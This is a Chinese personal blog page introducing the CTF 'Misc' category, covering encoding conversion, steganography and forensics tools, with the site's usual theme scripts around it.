            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-Misc概述"><a href="#1-Misc概述" class="headerlink" title="1. Misc概述"></a>1. Misc概述</h3><p>MISC，即Miscellaneous，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。</p>
<p>MISC，中文即杂项，包括隐写，数据还原，脑洞、社会工程、与信息安全相关的大数据等。</p>
<p>竞赛过程中解MISC时会涉及到各种脑洞，各种花式技巧，主要考察选手的快速理解、学习能力以及日常知识积累的广度、深度。</p>
<p>MISC这一块并不像PWN\REVERSE等需要深厚的理论基础，所以我们直接从经典题目开始入手。</p>
<h3 id="2-Misc题目类型"><a href="#2-Misc题目类型" class="headerlink" title="2. Misc题目类型"></a>2. Misc题目类型</h3><p>Misc大体上分为Encode编码转换、Steg隐写分析、Forensic数字取证以及其他类型</p>
<h3 id="3-编码转换"><a href="#3-编码转换" class="headerlink" title="3. 编码转换"></a>3. 编码转换</h3><p>由于编码很多种，可以在网上找各种站长工具对编码进行转换，而且效率很高！</p>
<p>常见的编码有：base64、base32、base16、ascii、unicode、url、摩斯编码、曼切斯特编码等</p>
<h3 id="4-取证和隐写分析"><a href="#4-取证和隐写分析" class="headerlink" title="4. 取证和隐写分析"></a>4. 取证和隐写分析</h3><h4 id="4-1-常见的工具"><a href="#4-1-常见的工具" class="headerlink" title="4.1 常见的工具"></a>4.1 常见的工具</h4><p>文本编辑工具：</p>
<ul>
<li>010Editor</li>
<li>UtralEdit</li>
<li>Winhex</li>
</ul>
<p>隐写工具：</p>
<ul>
<li>StegSolver</li>
<li>Stegdetect</li>
<li>wbSteg4</li>
<li>MP3Stego</li>
<li>outguess</li>
<li>stepic</li>
<li>steghide</li>
</ul>
<p>其他工具：</p>
<ul>
<li>7zcracker</li>
<li>archpr</li>
<li>tweakpng</li>
<li>audacity</li>
<li>binwalk</li>
<li>foremost</li>
<li>Ffmpeg</li>
<li>Alternatestreamview</li>
<li>Dsfok-tools</li>
<li>Snow</li>
</ul>
<h4 id="4-2-常见的隐写术"><a href="#4-2-常见的隐写术" class="headerlink" title="4.2 常见的隐写术"></a>4.2 常见的隐写术</h4><p>从最早的图种(copy /b test.jpg+test.torrent test.jpg),<br>CTF比赛中最开始的图片隐写(JPG，PNG，GIF)<br>Word，PDF等隐写<br>音频，视频中的隐写(波形，频谱…….)<br>Exe中的病毒行为分析<br>Pcap流量包<br>磁盘文件(IMG,VMDK)<br>交换数据流(NTFS数据流)<br>HTML文件</p>
<h3 id="5-自己的思考"><a href="#5-自己的思考" class="headerlink" title="5. 自己的思考"></a>5. 自己的思考</h3><p>想要深入学习Misc，首先需要熟练掌握一些文件格式，并能够根据相应的格式合理运用工具，如此才能掌握Misc！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/me.jpg"
               alt="Introspelliam" />
          <p class="site-author-name" itemprop="name">Introspelliam</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
            
              <a href="/archives/">
            
                <span class="site-state-item-count">128</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">15</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">54</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                    
                      Weibo
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Introspelliam</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  








  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
  


  

  

</body>
</html>
